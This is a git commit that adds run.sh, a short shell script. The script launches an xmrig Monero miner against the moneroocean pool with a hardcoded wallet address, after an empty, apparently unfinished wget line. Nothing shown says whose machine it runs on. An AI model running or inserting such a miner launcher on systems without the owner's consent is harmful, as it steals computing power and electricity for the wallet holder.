31e79fc18467ef7dde09e814b0953d297204c819
osrun <44208422+osrun@users.noreply.github.com>
2018-10-16 16:06:44 -0300

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,3 @@
+#!/bin/sh
+wget 
+/xmrig/build/xmrig -a cryptonight -o stratum+tcp://gulf.moneroocean.stream:80 -u 497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg -p y
